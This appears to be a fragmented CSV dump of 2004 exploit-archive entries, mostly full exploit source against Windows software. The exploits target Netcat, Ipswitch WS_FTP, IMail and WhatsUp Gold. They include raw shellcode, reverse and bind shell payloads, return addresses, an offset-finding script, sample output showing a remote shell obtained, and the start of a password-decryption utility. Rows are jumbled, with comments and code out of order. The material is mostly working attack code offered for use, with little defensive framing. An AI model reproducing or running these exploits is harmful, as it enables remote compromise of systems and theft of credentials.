""\x8B\x4A\x3C\x8B\x74\x11\x78\x8D\x74\x16\x1C\xB1\x03\xAD\x03\xC2""
""\x50\xE2\xFA\x4B\x8B\x75\xF8\x33\xC0\x50\x50\xAD\x03\xC2\x33\xC9""
""\x66\x03\x08\x02\x08\x40\x80\x38\x01\x7D\xF5\x58\x40\x66\x3B\x0B""
""\x75\xE8\x5E\x96\x4E\xD1\xE6\x03\x75\xF4\x66\xAD\xC1\xE0\x02\x03""
""\x45\xFC\x96\xAD\x03\xC2\xAB\x4B\x80\x3B\x01\x75\xC6\xC9\xFE\x0B""
""\x83\xEB\x06\x80\x7B\xFF\x01\x74\x10\x53\xFF\x14\x2F\x92\x6A\xF0""
""\x4B\x75\x9B\x90\x90\x90\x90\x90\x90\x95\xFF\x57\xF0\x33\xC9\x51""
""\x51\x51\x51\x41\x51\x41\x51\xFF\x57\xF8\x87\xCF\x5F\x83\xC7\x18""
""\xAB\xAB\xAB\x4B\xFE\x0B\x4B\x53\x53\x50\xFF\x51\xF4\xB8\x64\x6E""
""\x65\x01\x2D\x01\x01\x01\x01\x50\x54\xFF\xD5\x90"";
bmoore.asm
;*********************************** Christmas Shells***************************************
; Callback Shell.
; Directly set std handles and call system()
; 220 (DCh) bytes
; its not code, its antic0de
; and it works now too %-)
; Left it in tasm format.
; tasm32 -ml /m5 bmoore.asm
; tlink32 -Tpe -c -x bmoore.obj ,,, import32
;*********************************** Christmas Shells***************************************
; Jimminy jellicas its been jimplemented.
;  Oddity,Dsp,Shammah,Santa Claus and the rest of the loco locals
;  All the o/s peeps who know whats what.
;//bmoore
; Tested working on Win2k SP4 Server,Pro and WinXP SP1a Pro Eng.
;//class101
.586p
locals
.model flat, stdcall
extrn ExitProcess:PROC
extrn WSAStartup:PROC
extrn WSACleanup:PROC
.data
wsadescription_len equ 256
wsasys_status_len equ 128
WSAdata struct
wVersion dw ?
wHighVersion dw ?
szDescription db wsadescription_len+1 dup (?)
szSystemStatus db wsasys_status_len+1 dup (?)
iMaxSockets dw ?
iMaxUdpDg dw ?
lpVendorInfo dw ?
WSAdata ends
wsadata WSAdata <?>
.code
; Winsock + copy to stack code
start:
push    offset wsadata
push    0101h
call    WSAStartup
or      eax, eax
jz      winsock_found
jmp     codeend
winsock_found:
mov ebx,offset realstart
sub esp,400h
mov eax,esp
Copyit:
mov cl,byte ptr [ebx]
mov byte ptr [eax],cl
inc eax
inc ebx
cmp ebx,offset codeend
jle Copyit
jmp esp
; This is the start of the shell code
realstart:
jmp over_data
sockdat db 02h,01h,00h,065h
db 07fh,00h,00h,01h
hashes db 01h
dw 364Ah
db ""MSVCRT"",01
dw 422Ah
dw 8AD4h
db ""WS2_32"",01
dw 817Ch
dw 4E2Ch
over_data:
push 0ACC3575Fh
call esp
mov  esi,7ffdf00ch
lodsd
push  dword ptr [esi]
mov  esi,[eax + 1ch]
lodsd
mov  edx,[eax + 08h]
push -8
lea ebx,[edi-8]
LookupFunctions:
push  esp
pop  ebp
mov ecx,dword ptr [edx + 3ch]
mov  esi,dword ptr [ecx + edx + 78h]
lea  esi,dword ptr [esi + edx + 1ch]
mov  cl,3
StoreAddress:
lodsd
add  eax,edx
push  eax
loop  short StoreAddress
SearchStart:
dec  ebx
mov  esi,dword ptr [ebp - 8]
xor  eax,eax
push  eax
Search:
push  eax
lodsd
add  eax,edx
xor  ecx,ecx
hashy:
add  cx,word ptr [eax]
add  cl,byte ptr [eax]
inc  eax
cmp  byte ptr [eax],01
jge  hashy
pop  eax
inc  eax
cmp  cx,[ebx]
jne  Search
pop  esi
xchg  esi,eax
dec  esi
shl     esi,1
add     esi,dword ptr [ebp - 0ch]
lodsw
shl     eax,2
add     eax,dword ptr [ebp - 4h]
xchg  esi,eax
lodsd
add     eax,edx
stosd
dec  ebx
cmp  byte ptr [ebx],01h
jne short SearchStart
leave
dec  byte ptr [ebx]
sub  ebx,06h
;//bmoore
cmp  byte ptr [ebx-1],01h
je  short Done_Finding
;//class101
push  ebx
call  dword ptr [edi + ebp]
xchg  edx,eax
push  -16
dec  ebx
jne  short LookupFunctions
;//bmoore
nop
nop
nop
nop
nop
nop
;//class101
Done_Finding:
xchg  eax,ebp
call  [EDI - 10h]
xor  ecx,ecx
push ecx
push ecx
push ecx
push ecx
inc  ecx
push ecx
inc  ecx
push  ecx
call [EDI - 08h]
xchg  ecx,edi
pop  edi
add  edi,18h
stosd
stosd
stosd
dec ebx
dec byte ptr [ebx]
dec ebx
push ebx
push ebx
push   eax
call [ecx - 0ch]
mov eax,1656E64h
sub eax,01010101h
push eax
push esp
call ebp
nop
call    WSACleanup
codeend:
end     start
;//bmoore
---------EOF
static char payload[1000];
char jmpebx[]=""\x73\x1c\x57\x7c""; file://JMP EBX - kernel32.dll - Win2k SP4 Server,Pro English
char popopret[]=""\xb1\x2c\xc2\x77""; file://POP,POP,RET - msvcrt.dll - WinXP SP2,SP1a,SP1 Pro English - I finally found out XP exploitation ;<
char jmp1[]=""\xeb\x07\x90"";        file://JMP 9 bytes down
char jmp2[]=""\x90\x90\x90\xe9\x07\xff\xff\xff"";  file://long JMP up
char gay[]=""\x4b\x2d\x4f\x54\x69\x4b""; file://giving bl0wjob for free :>
WSADATA wsadata;
void ver();
void usage(char* us);
int main(int argc,char *argv[])
ver();
unsigned long gip;
unsigned short gport;
if ((argc!=6)||(atoi(argv[1])<1)||(atoi(argv[1])>2)){usage(argv[0]);return -1;}
gip=inet_addr(argv[4])^(long)0x00000000;
gport=htons(atoi(argv[5]))^(short)0x0000;
if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf(""[+] wsastartup error\n"");return -1;}
gip=inet_addr(argv[4])^(ULONG)0x00000000;
gport=htons(atoi(argv[5]))^(USHORT)0x0000;
int ip=htonl(inet_addr(argv[2])), port=atoi(argv[3]), sz, sizeA, sizeB,  sizeC, c, b, a;
char *target, *os;
memcpy(&scode[6], &gip, 4);
memcpy(&scode[4], &gport, 2);
if (atoi(argv[1]) == 1){target=jmpebx;os=""Win2k SP4 Server English\n[+]            Win2k SP4 Pro.   English"";}
if (atoi(argv[1]) == 2){target=popopret;os=""WinXP SP2  Pro. English\n[+]            WinXP SP1a Pro. English\n[+]            WinXP SP1  Pro. English"";}
SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
s=socket(AF_INET,SOCK_STREAM,0);
if (s==-1){printf(""[+] socket() error\n"");return -1;}
printf(""[+] target(s): %s\n"",os);
server.sin_family=AF_INET;
server.sin_addr.s_addr=htonl(ip);
server.sin_port=htons(port);
connect(s,( struct sockaddr *)&server,sizeof(server));
timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
switch(select(s+1,NULL,&mask,NULL,&timeout))
case -1: {printf(""[+] select() error\n"");closesocket(s);return -1;}
case 0: {printf(""[+] connect() error\n"");closesocket(s);return -1;}
default:
if(FD_ISSET(s,&mask))
printf(""[+] connected, constructing the payload...\n"");
Sleep(2000);
Sleep(2);
sizeA=10;
sizeB=228-sizeof(scode);
sizeC=25;
sz=10+227+3+4+8+25;
memset(payload,0,sizeof(payload));
for (a=0;a<sizeA;a++){strcat(payload,""\x90"");}
strcat(payload,scode);
for (b=0;b<sizeB;b++){strcat(payload,""\x90"");}
strcat(payload,jmp1);
strcat(payload,target);
strcat(payload,jmp2);
for (c=0;c<sizeC;c++){strcat(payload,""\x90"");}
if (send(s,payload,strlen(payload),0)==-1) { printf(""[+] sending error, the server prolly rebooted.\n"");return -1;}
Sleep(1000);
Sleep(1);
printf(""[+] size of payload: %d\n"",sz);
printf(""[+] payload send, look at your listener, you should get a shell\n"");
return 0;
closesocket(s);
WSACleanup();
return 0;
void usage(char* us)
printf(""USAGE: 101_ncat.exe Target VulnIP VulnPORT GayIP GayPORT\n"");
printf(""TARGETS:                               \n"");
printf(""      [+] 1. Win2k SP4  Server English  (*)\n"");
printf(""      [+] 1. Win2k SP4  Pro.   English  (*)\n"");
printf(""      [+] 2. WinXP SP1  Pro.   English  (*)\n"");
printf(""      [+] 2. WinXP SP1a Pro.   English  (*)\n"");
printf(""      [+] 2. WinXP SP2  Pro.   English  (*)\n"");
printf(""NOTE:                               \n"");
printf(""      The exploit reverse a cmd to GayIP:GayPORT :>\n"");
printf(""      A wildcard (*) mean Tested.\n"");
return;
void ver()
printf(""                                                                   \n"");
printf(""        ===================================================[v0.1]====\n"");
printf(""        ==========Netcat v1.1, The TCP/IP Swiss Army Knife===========\n"");
printf(""        =========\""-e\"" Switch, Remote Buffer Overflow Exploit=========\n"");
printf(""        ======coded by class101=============[Hat-Squad.com 2004]=====\n"");
printf(""        =============================================================\n"");
printf(""                                                                   \n"");"
2004-11-29,DoS,Windows,NoPh0BiA,Ipswitch WS_FTP Server 5.03,MKD Remote Buffer Overflow,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <errno.h>
#define PORT 21
#define RPORT 4444
#define RET ""\x53\x9B\x2E\x7C"" /*win2k sp4*/
#!/usr/bin/perl
# WS_FTP RET Address finder
# Noam Rathaus of Beyond Security Ltd.
// milw0rm.com [2004-11-29]","no@0x00:~/Exploits/IPS-WSFTP$ ./IPSWSFTP-exploit 10.20.30.2 test test
***Ipswitch WS_FTP Remote buffer overflow exploit by NoPh0BiA.***
[x] Connected to: 10.20.30.2 on port 21.
[x] Sending Login..done.
[x] Sending bad code..done.
[x] Checking if exploitation was successful..
[x] Connected to: 10.20.30.2 on port 4444.
[x] 0wn3d!
Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.
C:\WINNT\system32>
Greetz to Reed Arvin, NtWaK0,kane,schap, and kamalo :)
char shellcode[]=
""\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xb1\xbe""
""\x94\x1d\x83\xeb\xfc\xe2\xf4\x4d\x56\xc2\x1d\xb1\xbe\xc7\x48\xe7""
""\xe9\x1f\x71\x95\xa6\x1f\x58\x8d\x35\xc0\x18\xc9\xbf\x7e\x96\xfb""
""\xa6\x1f\x47\x91\xbf\x7f\xfe\x83\xf7\x1f\x29\x3a\xbf\x7a\x2c\x4e""
""\x42\xa5\xdd\x1d\x86\x74\x69\xb6\x7f\x5b\x10\xb0\x79\x7f\xef\x8a""
""\xc2\xb0\x09\xc4\x5f\x1f\x47\x95\xbf\x7f\x7b\x3a\xb2\xdf\x96\xeb""
""\xa2\x95\xf6\x3a\xba\x1f\x1c\x59\x55\x96\x2c\x71\xe1\xca\x40\xea""
""\x7c\x9c\x1d\xef\xd4\xa4\x44\xd5\x35\x8d\x96\xea\xb2\x1f\x46\xad""
""\x35\x8f\x96\xea\xb6\xc7\x75\x3f\xf0\x9a\xf1\x4e\x68\x1d\xda\x30""
""\x52\x94\x1c\xb1\xbe\xc3\x4b\xe2\x37\x71\xf5\x96\xbe\x94\x1d\x21""
""\xbf\x94\x1d\x07\xa7\x8c\xfa\x15\xa7\xe4\xf4\x54\xf7\x12\x54\x15""
""\xa4\xe4\xda\x15\x13\xba\xf4\x68\xb7\x61\xb0\x7a\x53\x68\x26\xe6""
""\xed\xa6\x42\x82\x8c\x94\x46\x3c\xf5\xb4\x4c\x4e\x69\x1d\xc2\x38""
""\x7d\x19\x68\xa5\xd4\x93\x44\xe0\xed\x6b\x29\x3e\x41\xc1\x19\xe8""
""\x37\x90\x93\x53\x4c\xbf\x3a\xe5\x41\xa3\xe2\xe4\x8e\xa5\xdd\xe1""
""\xee\xc4\x4d\xf1\xee\xd4\x4d\x4e\xeb\xb8\x94\x76\x8f\x4f\x4e\xe2""
""\xd6\x96\x1d\xa0\xe2\x1d\xfd\xdb\xae\xc4\x4a\x4e\xeb\xb0\x4e\xe6""
""\x41\xc1\x35\xe2\xea\xc3\xe2\xe4\x9e\x1d\xda\xd9\xfd\xd9\x59\xb1""
""\x37\x77\x9a\x4b\x8f\x54\x90\xcd\x9a\x38\x77\xa4\xe7\x67\xb6\x36""
""\x44\x17\xf1\xe5\x78\xd0\x39\xa1\xfa\xf2\xda\xf5\x9a\xa8\x1c\xb0""
""\x37\xe8\x39\xf9\x37\xe8\x39\xfd\x37\xe8\x39\xe1\x33\xd0\x39\xa1""
""\xea\xc4\x4c\xe0\xef\xd5\x4c\xf8\xef\xc5\x4e\xe0\x41\xe1\x1d\xd9""
""\xcc\x6a\xae\xa7\x41\xc1\x19\x4e\x6e\x1d\xfb\x4e\xcb\x94\x75\x1c""
""\x67\x91\xd3\x4e\xeb\x90\x94\x72\xd4\x6b\xe2\x87\x41\x47\xe2\xc4""
""\xbe\xfc\xed\x3b\xba\xcb\xe2\xe4\xba\xa5\xc6\xe2\x41\x44\x1d"";
struct sockaddr_in hrm;
void shell(int sock)
fd_set fd_read;
char buff[1024];
int n;
while(1) {
FD_SET(sock,&fd_read);
FD_SET(0,&fd_read);
if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
if( FD_ISSET(sock, &fd_read) ) {
n=read(sock,buff,sizeof(buff));
if (n == 0) {
printf (""Connection closed.\n"");
exit(EXIT_FAILURE);
} else if (n < 0) {
perror(""read remote"");
exit(EXIT_FAILURE);
write(1,buff,n);
if ( FD_ISSET(0, &fd_read) ) {
if((n=read(0,buff,sizeof(buff)))<=0){
perror (""read user"");
exit(EXIT_FAILURE);
write(sock,buff,n);
close(sock);
int conn(char *ip,int p)
int sockfd;
hrm.sin_family = AF_INET;
hrm.sin_addr.s_addr = inet_addr(ip);
hrm.sin_port = htons(p);
bzero(&(hrm.sin_zero),8);
sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&hrm,sizeof(struct sockaddr))) < 0)
perror(""connect"");
exit(0);
printf(""[x] Connected to: %s on port %d.\n"",ip,p);
return sockfd;
int main(int argc, char *argv[])
printf(""***Ipswitch WS_FTP Remote buffer overflow exploit by NoPh0BiA.***\n"");
if(argc<4)
fprintf(stderr,""Usage: IP USER PASS\n"");
exit(0);
char *buffer=malloc(954),*A=malloc(519),*B=malloc(32),*target=argv[1],*user=malloc(32),*pass=malloc(32),*request=malloc(32);
int x,y;
memset(request,'\0',32);
memset(user,'\0',32);
memset(pass,'\0',32);
memset(buffer,'\0',954);
memset(A,0x41,519);
memset(B,0x42,32);
strcpy(user,argv[2]);
strcpy(pass,argv[3]);
strcat(buffer,A);
strcat(buffer,RET);
strcat(buffer,B);
strcat(buffer,shellcode);
sprintf(request,""USER %s\r\nPASS %s\r\n"",user,pass);
x = conn(target,PORT);
printf(""[x] Sending Login.."");
write(x,request,strlen(request));
printf(""done.\n"");
sleep(2);
printf(""[x] Sending bad code.."");
write(x,""MKD "",4);
write(x,buffer,954);
write(x,""\r\n"",2);
printf(""done.\n"");
sleep(2);
close(x);
printf(""[x] Checking if exploitation was successful..\n"");
y=conn(target,RPORT);
printf(""[x] 0wn3d!\n\n"");
shell(y);
close(y);
Helper script:
The following Perl script can be used to find the coordinates for A and B so that the RET address affects the EIP and the shellcode is executed.
use strict;
use IO::Socket::INET;
usage() unless (@ARGV >= 2);
my $host = shift(@ARGV);
my $port = shift(@ARGV);
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die ""Cannot connect to the host.\n"";
$socket->autoflush(1);
while (<$socket>)
print $_;
if (/220 /)
last;
print $socket ""USER noam\n"";
while (<$socket>)
print $_;
if (/331 /)
last;
print $socket ""PASS password\n"";
while (<$socket>)
print $_;
if (/230 /)
last;
my $RET = 4;
my $size = 2000;
my $presize = shift(@ARGV) || 200;
my $postsize = shift(@ARGV) || 800;
print $socket ""MKD "".(""A""x$presize).""DEEF"".(""B""x($size - $presize - $postsize - $RET)).(""C""x$postsize).""\n"";
while (<$socket>)
print $_;
print ""Done.\n"";
close($socket);
exit(0);
sub usage
print ""\nws_ftp.pl MKD aligment assistant\n"";
print ""\nUsage: ws_ftp.pl [host] [port] [pre] [post]\n"";
print ""We generate something of the sorts of \""A\""xpre \""DEEF\"" \""B\""x(2000-pre-post-4) \""C\""xpost.\n"";
print ""You need to align your pre and post so that the EIP is DEEF 0x44454546\n"";
print ""\n"";
exit(1);"
2004-11-12,Remote,Windows,Zatlander,IPSwitch IMail 8.13,'DELETE' Remote Stack Overflow,"#!/usr/bin/perl -w
# IPSwitch-IMail-8.13-DELETE
# Discovered by : Muts
# Coded by : Zatlander
# WWW.WHITEHAT.CO.IL
# Plain vanilla stack overflow in the DELETE command
# Restrictions:
#   - Need valid authentication credentials
#   - Input buffer only allows characters between x20 -> x7e
# Credits:
#   - http://www.metasploit.org  - HD Moore for the metasploit shellcode
#   - http://www.edup.tudelft.nl/~bjwever/menu.html - skylined for the ALPHA ascii shellcode generator
#   - http://www.hick.org - for the syscall egghunt code in the paper ""Understanding Windows Shellcode""
# Find shellcode with signature ""w00tw00t""; start from esp
# from 0 -> $egghunter = ""TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIVSyBUco0OKbWdp00ptH0uXqRnkHH2a3PLMvtvqzm6NulfePabTiaxbycrb09Gjt5xkTySjeTsEzFmSo2eXyoKRA"";
# Real shellcode: bind shell on port 4444 ( ./alpha edx < shellcode.bin )
# jb +20; jnb +20  -> jump over return address (0x21 is first ascii safe offset)
# 0x6921526A -> pointer to ""CALL [EDX+8]"" ends up in return address
# This should hopefully be the only version dependent variable here.
# Find an ASCII safe address pointing to a CALL [EDX+8] for your OS
# aAA aligns ESP with the egghunter shellcode (popad, pop, pop)
#$msg =  $imap->body_string($uid) or die ""Cannot get message: $@"";
#print ""retrieving $uid back: $msg\n"";
# milw0rm.com [2004-11-12]","use IO::Socket;
use Getopt::Std;
use Mail::IMAPClient;
print ""Exploit for the IPSwitch IMail DELETE buffer overflow\n"";
print ""C0d3d by Zatlander\n"";
print ""Discovered by Muts\n"";
print ""WWW.WHITEHAT.CO.IL\n"";
print ""For hacking purposes only!!!\n\n"";
$egghunter = ""TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkN44skpmkt7fPTpptx0UXpBLKkx1Q3PLMtT4QxMVN5lc5sQSDxqyrjSW2VYUJRUXkp9SjVdT5KVosKrWxioKRA"";
$shellcode = ""JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLjH2vUP7puPQCQEV6aGnkbLWT28NkpEWLlKpT35QhgqKZlKPJvxLKQJWPuQXkKSdrSyLKgDLKuQJNVQ9okLP1KpLlP8kPBT7wyQXOVmvahGZKl25kSLwTGdqeKQlK2zUts1jKSVnktL0KNkaJWlUQxkLK7tnkUQM8zKgrVQYP1OqNQMQKkreXWpSnSZp03i1tlKGilKSkvlLKQK5Lnk7kLKckTH0SSXLNpN6nJLKOJvK9IWK1ZLuPfawps0Rwv63cMYiuJHDguPuPS0Np7qWp7pnV6ywhYwMttYt0Yym5QYK62inDvzd0Kwy4nMDniyXYUYkENMHKxmylgKpWPSVRSovS4ruPckLMpKupRqKOYGK9YOoyKsLMBUTTRJs7Ryv1RsYoTtNokOv534pYk9dDNnyrxrtkgWPTKOtwIoRutpfQkp2ppPrpF0spPPaPv09oRuFLniYWuaYKScpSe86bC07a3lmYIpSZVpRpQGyoruQ4QCF7kOv5thBsSdSgIoRuUpNiYWPhpCRmStwpoyXcLGyjDqIPnmQlQ4NLaz7e69zSlkNgJZosXlPTkvQT7TTP1TQvYWpDWTul5QUQLIcLTdRhK9SLQ4RlmY1letPPLMSt5tFpqDrppQRqCaSqSa2iBqRqRspQKO45uPbH0rKNNS4VKOpU5TyoXPLIyvKO45S0QxnMN9fexNYov5S4oyHCbJKOKOTvkOzsyorU30BHl0MZfdaOkORu7tFQyKPSIo8PA"";
getopts(""h:u:p:"", \%args);
if ((!defined $args{h}) || (!defined $args{u}) || (!defined $args{p})) {
print ""Usage: $0 -h [host] -u [username] -p [password]\n"";
exit;}
$usr  = $args{u};
$pwd  = $args{p};
$host = $args{h};
$jmp21 = ""r!s!"";
$calledx8 = ""jR!i"";
$asciieh = ""aAA"" . $egghunter;
$asciisc = ""w00tw00t"" . $shellcode;
$email =
""From: \""The guy hacking you\"" <a\@b.com>\r\n"" .
""To: \""Poor You\"" <b\@c.com>\r\n"" .
""Subject: $asciisc\r\n"" .
""Date: Wed, 3 Nov 2004 14:45:11 +0100\r\n"" .
""Message-ID: <000101c4c1acdcndj6d69b90$5e01a8c0\@snorlax>\r\n"" .
""Content-Type: text/plain;\r\n\tcharset=\""us-ascii\""\r\n"" .
""Content-Transfer-Encoding: 7bit\r\n"" .
""\r\n"" .
$asciisc;
$payload = ""A"" x 236 . $jmp21 x 3 . $calledx8 . ""S"" x 29 . $asciieh . ""\r\n"";
print ""Login in to $host as $usr/$pwd\n"";
my $imap = Mail::IMAPClient->new( Server => $host, User => $usr, Password=> $pwd) or die ""Cannot connect: $@"";
print ""count: "" . $imap->message_count(""Inbox"") . ""\n"";
print ""Sending EGG\n"";
$imap->select(""Inbox"") or die ""Could not select: $@\n"";
my $uid = $imap->append( ""Inbox"", $email ) or die ""Cannot append: $@"";
$msg =  $imap->message_string($uid) or die ""Cannot get message: $@"";
print ""Overflowing DELETE\n"";
$imap->delete($payload) or die ""Cannot delete: $@n"";
print(""Finished...\n"");"
2004-10-04,Remote,Windows,LoWNOISE,IPSwitch WhatsUp Gold 8.03,Remote Buffer Overflow,"#!/usr/bin/perl
# [LoWNOISE] NotmuchG.pl v.1.5
# ================================================
# IPSWITCH WhatsUp Gold ver8.03 Remote Buffer Overflow Exploit
# ================================================
# Exploit by ET LoWNOISE Colombia
# et(at)cyberspace.org
# Oct/2004
# Tested on WIN2K SP4
# The exploit takes control by overwriting the pointer of a Structured
# installed by WhatsUP and points to a routine that handles exceptions.
# (http://www.thc.org/papers/Practical-SEH-exploitation.pdf Johnny
# The overflow string has to be around 4080 in length to generate an
# be manipulated by changing the SEH pointer (ret [815]).
# Bug Discovered by
# iDEFENSE Security Advisory 08.25.04
# http://www.idefense.com/application/poi/display?type=vulnerabilities
# Greetz to the midget, the m3 and los parces , the seltiks, p0ch1n,
# Bind shellcode port 28876 (HDM, metasploit.org)
http://127.0.0.1/NotifyAction.asp?action=AddType&instance=Beeper&end=end\r\n"";
#[-------815-------------] [ret] [-------------4080---------]
#[A.....811...A][jmp] [ret] [nops][shc][E.......E ]
#$cmd .= ""\xfe\x63\xa1\x71""; #winXP SP1 ws2help.dll
#$cmd .= ""LOWNOISE""; #garbage :D
# milw0rm.com [2004-10-04]","Exception Handler,
Cyberpunk THC)
exception that can
Ritt3r,Mav, f4lc0n..
use strict;
use IO::Socket::INET;
usage() unless (@ARGV == 2);
my $host = shift(@ARGV);
my $port = shift(@ARGV);
my $shellcode =
""\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"".
""\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"".
""\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"".
""\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"".
""\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"".
""\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"".
""\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"".
""\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"".
""\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"".
""\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"".
""\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"".
""\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"".
""\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x6a"".
""\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x24\xff\xff\xff\x31\xdb"".
""\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x50\x50\x50\x53\x53\x31\xc0"".
""\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x6a\x44"".
""\x89\xe6\x50\x55\x53\x53\x53\x53\x54\x56\x53\x53\x53\x43\x53\x4b"".
""\x53\x53\x51\x53\x89\xfd\xbb\x21\xd0\x05\xd0\xe8\xe2\xfe\xff\xff"".
""\x31\xc0\x48\x8b\x44\x24\x04\xbb\x43\xcb\x8d\x5f\xe8\xd1\xfe\xff"".
""\xff\x5d\x5d\x5d\xbb\x12\x6b\x6d\xd0\xe8\xc4\xfe\xff\xff\x31\xc0"".
""\x50\x89\xfd\xbb\x69\x1d\x42\x3a\xe8\xb5\xfe\xff\xff"";
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host,
PeerPort=>$port);
$socket or die ""Cannot connect to the host.\n"";
$socket->autoflush(1);
print $socket ""POST /_maincfgret.cgi HTTP/1.0\r\n"";
print $socket ""Accept: image/gif, image/x-xbitmap, image/jpeg,
image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel,
application/msword, application/x-shockwave-flash,
application/vnd.citrix.AdvGWClient-2_2, */*\r\n"";
print $socket ""Referer:
print $socket ""Accept-Language: en-us\r\nContent-Type:
application/x-www-form-urlencoded\r\nConnection: Keep-Alive\r\n"";
print $socket ""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT
5.1; T312461; .NET CLR 1.1.4322)\r\n"";
print $socket ""Host: 127.0.0.1\r\nContent-Length: "";
my $cmd =""page=notify&origname=&action=return&type=Beeper&instancename="";
$cmd .= ""A""x811; #815 -4
$cmd .= ""\xeb\x06\x90\x90""; #jumper <eb + 06> <garbage> jmp to shellcode
$cmd .= ""\xc4\x2a\x02\x75""; #win2k sp0-sp4 ws2help.dll
$cmd .= ""\x90""x2080;
$cmd .= $shellcode;
$cmd .= ""E""x(2000-length($shellcode)); #mas basura
$cmd .= ""&beepernumber=&upcode=0*&downcode=9*&trapcode=6*&end=end"";
print $socket length($cmd).""\r\nPragma: no-cache\r\nAuthorization: Basic
YWRtaW46YWRtaW4=\r\n\r\n"";
print $socket $cmd.""\r\n"";
close($socket);
exit(0);
sub usage
print ""\n[LoWNOISE] IPSWITCH WhatsUp Gold 8.03 Remote fr33 exploit\n"";
print ""===================================================\n"";
print ""\nUsage: NotmuchG.pl [host] [port]\n"";
print ""[host] Target host\n[port] WhatsUp webserver port\n\n"";
print ""\n Shell on tcp port 28876.\n\n"";
print ""ET LoWNOISE 2004\n"";
exit(1);"
2004-08-18,Local,Windows,Adik,IPSwitch IMail Server 8.1,Local Password Decryption Utility,"//#include ""stdafx.h""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>
#define snprintf _snprintf
#pragma comment(lib,""advapi32"")
#define ALLOWED_USERNAME_CHARS ""A-Z,a-z,0-9,-,_,.""
#define MAX_NUM 1024 //500
#define DOMAINZ ""Software\\IpSwitch\\IMail\\Domains""
#define VER ""1.1""
#define MAXSIZE 100
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//netmaniacnetmaniacnetman
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//adik 123456
//adikbek 123
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//return;
// adik 1234567
// adik 12
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//adik
//total_domains += dom
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//dump passwd from registry
//decrypt username passwd
// ThE eNd
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
// milw0rm.com [2004-08-18]","* IpSwitch IMail Server <= ver 8.1 User Password Decryption
* by Adik < netmaniac hotmail KG >
* IpSwitch IMail Server uses weak encryption algorithm to encrypt its user passwords. It uses
* polyalphabetic Vegenere cipher to encrypt its user passwords. This encryption scheme is
* relatively easy to break. In order to decrypt user password we need a key. IMail uses username
* as a key to encrypt its user passwords. The server stores user passwords in the registry under the key
